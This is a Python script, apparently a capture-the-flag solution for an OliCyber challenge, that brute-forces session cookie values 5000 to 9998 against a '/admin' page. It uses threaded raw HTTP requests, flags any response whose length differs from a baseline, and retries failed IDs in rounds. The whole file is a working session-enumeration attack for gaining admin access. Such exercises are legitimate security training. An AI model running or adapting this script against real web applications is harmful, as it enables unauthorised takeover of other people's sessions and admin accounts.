from concurrent.futures import ThreadPoolExecutor
import socket

host = "too-small-reminder.challs.olicyber.it"

def check(i):
    try:
        req = (
            f"GET /admin HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: close\r\n"
            f"Cookie: session_id={i}\r\n"
            f"\r\n"
        )

        s = socket.socket()
        s.settimeout(2.5)
        s.connect((host, 80))
        s.send(req.encode())

        response = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break

        s.close()

        if not response:
            print(f"[NO RESPONSE] {i}")
            return False

        res = response.decode(errors="ignore")
        length = len(res)

        # baseline = 208 in your case
        if length != 208:
            print("\n[!!!] FOUND ANOMALY")
            print("ID:", i)
            print("Length:", length)
            print(res[:300])
            exit()

        return True

    except:
        print(f"[ERROR] {i}")
        return False

def run_batch(ids, workers):
    failed = []

    def wrapper(i):
        success = check(i)
        if not success:
            failed.append(i)

    with ThreadPoolExecutor(max_workers=workers) as ex:
        ex.map(wrapper, ids)

    return failed


ids = list(range(5000, 9999))

round_num = 1
prev_failed_count = None

while True:
    print(f"\n=== ROUND {round_num} ===")

    failed = run_batch(ids, workers=5)

    print(f"Failed this round: {len(failed)}")

    # ✅ stop if no failures
    if not failed:
        print("All requests successful!")
        break

    # ⚠️ stop if no improvement
    if prev_failed_count is not None and len(failed) >= prev_failed_count:
        print("No improvement, stopping to avoid infinite loop.")
        break

    # prepare next round
    ids = failed
    prev_failed_count = len(failed)
    round_num += 1
